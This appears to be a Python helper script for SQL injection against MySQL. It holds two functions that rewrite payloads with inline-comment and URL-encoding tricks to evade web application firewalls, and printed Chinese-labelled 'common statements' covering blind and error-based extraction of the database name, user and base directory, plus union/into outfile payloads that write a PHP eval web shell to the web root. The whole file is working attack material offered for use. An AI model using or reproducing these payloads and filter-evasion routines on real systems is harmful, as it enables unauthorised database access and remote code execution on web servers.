def tamper1(payload):
    if payload:
        payload=payload.replace(" ","/*!90000aaa*/")
        payload=payload.replace("+","/*!90000aaa*/")
        payload=payload.replace("and","%26%26")
        payload=payload.replace("=","/*!90000aaa*/=/*!90000aaa*/")
        payload=payload.replace("union","union/*!90000aaa*/")
        payload=payload.replace("#","/*!90000aaa*/%23")
        payload=payload.replace("user()","user/*!()*/")
        payload=payload.replace("database()","database/*!()*/")
        payload=payload.replace("--","/*!90000aaa*/--")
        payload=payload.replace("select","/*!90000aaa*/select")
        payload=payload.replace("from","/*!90000aaa*//*!90000aaa*/from")
        return payload

def tamper2(payload):
    if payload:
        payload=payload.replace(" ","%23a%0a")
        payload=payload.replace("+","%23a%0a")
        payload=payload.replace("order","order%23a%0a")
        payload=payload.replace("--","/*!90000aaa*/--")
        payload=payload.replace("#","/*!90000aaa*/%23")
        payload=payload.replace("and","%26%26")
        payload=payload.replace("union","union%23a%0a")
        payload=payload.replace("user()","user/*!()*/")
        payload=payload.replace("version()","version/*!()*/")
        payload=payload.replace("database()","database/*!()*/")
        payload=payload.replace("group","group%23a%0a")
        payload=payload.replace("select","select%23a%0a")
        payload=payload.replace("from","from%23a%0a")
        return payload

print('Mysql混淆,目标处输入语句!')
print('''常用语句:
'+like+substr(1/(case+when+substr(database(),6,1)='N'+then+1+else+0+end),1,1)='a
1'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))
1'and substr((select database()),1,1)='a
1'and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))--+
1'union select null,null,0x3c3f70687020406576616c28245f504f53545b76616c75655d293b3f3e into outfile '/var/www/html/1.php'--+
1' union select 1,2,'<%3fphp+%40eval(%24_POST[shell])%3b%3f>' into outfile '路径'--+
1' into outfile '路径' fields terminated by '<%3fphp+%40eval(%24_POST[shell])%3b%3f>'--+''')
def check(**kwargs):
    payload = kwargs['url']
    payload1 = tamper1(payload)
    payload2 = tamper2(payload)

    print('语句一: %s'%payload1)
    print('语句二: %s'%payload2)





